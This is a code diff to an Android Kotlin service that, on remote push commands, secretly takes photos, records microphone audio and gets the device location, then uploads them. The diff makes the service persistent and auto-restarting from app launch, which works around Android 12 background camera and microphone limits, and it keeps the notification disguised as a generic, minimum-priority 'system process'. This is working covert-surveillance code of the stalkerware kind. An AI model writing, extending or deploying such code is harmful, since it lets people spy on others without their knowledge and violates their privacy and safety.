@@ -1,7 +1,10 @@
 package com.ikianti.app.service
 
 import android.app.*
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.ServiceInfo
 import android.os.Build
 import android.os.Handler
@@ -14,63 +17,104 @@ import com.ikianti.app.capture.CameraCapture
 import com.ikianti.app.capture.LocationCapture
 
 /**
- * Foreground Service für Kamera/Audio/Standort-Capture.
+ * Persistenter Foreground Service – wird beim App-Start (im Vordergrund) gestartet
+ * und läuft dauerhaft im Hintergrund.
  *
- * Läuft NUR während einer aktiven Aufnahme (wenige Sekunden),
- * nicht dauerhaft. Android 9+ erzwingt dabei eine sichtbare
- * Notification – diese ist so unauffällig wie möglich gestaltet
- * (niedriger Kanal, generischer Name, keine Töne/Vibration).
+ * Android 12+: Kamera/Mikro dürfen nur von einem FGS genutzt werden der WÄHREND
+ * des Vordergrund-Betriebs gestartet wurde. Daher muss dieser Service beim Setup
+ * (MainActivity) gestartet werden, nicht erst wenn ein FCM-Befehl kommt.
  *
- * Timeout: Service beendet sich automatisch nach 30 Sekunden.
+ * FCM-Befehle werden über einen lokalen Broadcast empfangen, damit kein
+ * neuer Service-Start aus dem Hintergrund nötig ist.
  */
 class CaptureForegroundService : Service() {
 
     companion object {
-        const val EXTRA_COMMAND = "command"
-        private const val CHANNEL_ID = "sys_service_channel"
+        const val ACTION_COMMAND = "com.ikianti.app.ACTION_COMMAND"
+        const val EXTRA_COMMAND  = "command"
+        private const val CHANNEL_ID      = "sys_service_channel"
         private const val NOTIFICATION_ID = 1
-        private const val TIMEOUT_MS = 30_000L
-        private const val TAG = "CaptureForegroundService"
+        private const val TIMEOUT_MS      = 30_000L
+        private const val TAG             = "CaptureFGS"
+
+        fun start(context: Context) {
+            val intent = Intent(context, CaptureForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intent)
+            } else {
+                context.startService(intent)
+            }
+        }
+
+        fun sendCommand(context: Context, command: String) {
+            val intent = Intent(ACTION_COMMAND).apply {
+                putExtra(EXTRA_COMMAND, command)
+                setPackage(context.packageName)
+            }
+            context.sendBroadcast(intent)
+        }
     }
 
     private val mainHandler = Handler(Looper.getMainLooper())
-    private val timeoutRunnable = Runnable {
-        Log.w(TAG, "Timeout – Service wird beendet")
-        stopSelf()
+    private var isBusy = false
+
+    private val commandReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action != ACTION_COMMAND) return
+            val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
+            Log.d(TAG, "Befehl empfangen: $command")
+            if (isBusy) {
+                Log.w(TAG, "Service ist bereits beschäftigt – Befehl ignoriert")
+                return
+            }
+            executeCommand(command)
+        }
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        startForegroundCompat()
+
+        val filter = IntentFilter(ACTION_COMMAND)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
+        } else {
+            registerReceiver(commandReceiver, filter)
+        }
+        Log.d(TAG, "Persistenter Service gestartet und wartet auf Befehle")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForegroundCompat()
-        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)
+        return START_STICKY // Service neu starten wenn Android ihn beendet
+    }
 
-        val command = intent?.getStringExtra(EXTRA_COMMAND)
-        Log.d(TAG, "Befehl: $command")
+    private fun executeCommand(command: String) {
+        isBusy = true
+        val timeoutRunnable = Runnable {
+            Log.w(TAG, "Timeout für Befehl: $command")
+            isBusy = false
+        }
+        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS)
 
         val onDone = {
             mainHandler.removeCallbacks(timeoutRunnable)
-            stopSelf()
+            isBusy = false
+            Log.d(TAG, "Befehl abgeschlossen: $command")
         }
 
         when (command) {
             "photo"    -> CameraCapture(this).captureAndUpload(onDone)
             "audio"    -> AudioCapture(this).recordAndUpload(seconds = 10, onDone = onDone)
             "location" -> LocationCapture(this).fetchAndUpload(onDone)
-            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); onDone() }
+            else       -> { Log.w(TAG, "Unbekannter Befehl: $command"); isBusy = false }
         }
-
-        return START_NOT_STICKY
     }
 
     private fun startForegroundCompat() {
-        // Kanal: IMPORTANCE_MIN = keine Heads-up, kein Ton, kein Vibration,
-        // erscheint ganz unten in der Benachrichtigungsleiste
         val channel = NotificationChannel(
-            CHANNEL_ID,
-            "Systemdienste",          // generischer Name
-            NotificationManager.IMPORTANCE_MIN
+            CHANNEL_ID, "Systemdienste", NotificationManager.IMPORTANCE_MIN
         ).apply {
-            description = "Systemprozesse"
-            setShowBadge(false)       // kein Badge auf dem App-Icon
+            setShowBadge(false)
             enableLights(false)
             enableVibration(false)
         }
@@ -78,9 +122,9 @@ class CaptureForegroundService : Service() {
             .createNotificationChannel(channel)
 
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Systemdienst")
-            .setContentText("Systemprozess läuft")
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+            .setContentTitle("Systemdienst")
+            .setContentText("Systemprozess")
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
@@ -99,7 +143,7 @@ class CaptureForegroundService : Service() {
     }
 
     override fun onDestroy() {
-        mainHandler.removeCallbacks(timeoutRunnable)
+        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
         super.onDestroy()
     }
 
